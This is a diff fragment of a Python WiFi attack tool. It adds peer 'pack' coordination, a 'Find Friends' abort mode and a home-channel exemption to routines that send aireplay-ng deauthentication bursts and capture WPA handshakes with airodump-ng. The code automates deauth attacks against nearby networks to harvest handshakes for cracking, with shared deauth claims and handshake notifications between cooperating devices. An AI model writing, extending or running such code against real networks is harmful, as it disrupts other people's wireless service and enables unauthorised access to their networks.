+        if self._pack_mode and strategy != 'passive':
+            for peer_name, peer_info in self._pack_peers.items():
+                peer_claims = peer_info.get('deauth_claims', {})
+                claim_time = peer_claims.get(bssid)
+                if claim_time and (time.time() - float(claim_time)) < 60:
+                    strategy = 'passive'
+                    self._log_activity('INFO', f"Strategy: passive (pack peer {peer_name} is deauthing {bssid})")
+                    break
 
         # Use parallel capture in dual-mode, otherwise standard capture
         if self.dual_mode:
@@ -2687,6 +3243,12 @@ class WiFiScanner:
             last_pcap_size = 0  # Track capture file growth for early-exit
             
             while time.time() - start_time < max_wait and self.running:
+                # Abort capture if Find Friends mode activated
+                if self._find_friends_mode:
+                    self._log_activity('INFO', f"Aborting capture of {ssid} — Find Friends mode active")
+                    failure_reason = 'find_friends'
+                    break
+                
                 elapsed = time.time() - start_time
                 
                 # Watchdog: check if airodump-ng died mid-capture
@@ -2754,6 +3316,7 @@ class WiFiScanner:
                     
                     self.stats['handshakes'] += 1
                     self.capture_successes += 1
+                    self._pack_notify_handshake(bssid, ssid, dest_file, channel)
                     
                     # Record success in persistent knowledge
                     if self.db and hasattr(self.db, 'record_success'):
@@ -2909,6 +3472,12 @@ class WiFiScanner:
             last_pcap_size = 0  # Track capture file growth for early-exit
             
             while time.time() - start_time < max_wait and self.running:
+                # Abort capture if Find Friends mode activated
+                if self._find_friends_mode:
+                    self._log_activity('INFO', f"Aborting capture of {ssid} — Find Friends mode active")
+                    failure_reason = 'find_friends'
+                    break
+                
                 elapsed = time.time() - start_time
                 
                 # Watchdog: check if airodump-ng died mid-capture
@@ -2978,6 +3547,7 @@ class WiFiScanner:
                     
                     self.stats['handshakes'] += 1
                     self.capture_successes += 1
+                    self._pack_notify_handshake(bssid, ssid, dest_file, channel)
                     
                     # Record success in persistent knowledge
                     if self.db and hasattr(self.db, 'record_success'):
@@ -3046,6 +3616,11 @@ class WiFiScanner:
     def _send_deauth_on_interface(self, bssid, channel, count, interface):
         """Send deauth burst using aireplay-ng on specific interface.
         Targets specific client MACs when known, then broadcasts. Returns True on success."""
+        if self._find_friends_mode:
+            return False
+        if self.home_channel and channel == self.home_channel:
+            self._log_activity('DEBUG', f"Skipping deauth on home channel {channel} (would disrupt LAN)")
+            return False
         try:
             # Get known client MACs for this BSSID
             client_macs = self.seen_networks.get(bssid, {}).get('client_macs', [])
@@ -3084,6 +3659,9 @@ class WiFiScanner:
                 if stderr:
                     self._log_activity('WARN', f"Deauth warning: {stderr[:100]}")
             
+            # Record deauth claim for pack coordination
+            if any_success:
+                self._deauth_claims[bssid] = time.time()
             return any_success
             
         except subprocess.TimeoutExpired:
@@ -3095,6 +3673,11 @@ class WiFiScanner:
     
     def _send_deauth(self, bssid, channel, count):
         """Send deauth burst using aireplay-ng. Returns True on success."""
+        if self._find_friends_mode:
+            return False
+        if self.home_channel and channel == self.home_channel:
+            self._log_activity('DEBUG', f"Skipping deauth on home channel {channel} (would disrupt LAN)")
+            return False
         try:
             self._log_activity('DEAUTH', f"Sending {count} deauth packets to {bssid} on ch {channel}")
             
@@ -3110,6 +3693,8 @@ class WiFiScanner:
             
             if result.returncode == 0:
                 self.stats['deauths_sent'] += count
+                # Record deauth claim for pack coordination
+                self._deauth_claims[bssid] = time.time()
                 return True
             else:
                 stderr = result.stderr.strip()
@@ -3166,6 +3751,7 @@ class WiFiScanner:
             self.capture_successes += 1
             self.last_handshake_time = time.time()
             self._log_activity('SUCCESS', f"Bonus capture: {ssid} ({bssid_fmt})")
+            self._pack_notify_handshake(bssid_fmt, ssid, dest_file, channel)
             if self.db and hasattr(self.db, 'record_success'):
                 self.db.record_success(bssid_fmt)
         except Exception as e:
@@ -3452,6 +4038,7 @@ class WiFiScanner:
         self.stats['wps_captures'] = self.stats.get('wps_captures', 0) + 1
         self.capture_successes += 1
         self.last_handshake_time = time.time()
+        self._pack_notify_handshake(bssid, ssid, dest_file, channel)
         
         # Record success in knowledge
         if self.db and hasattr(self.db, 'record_success'):
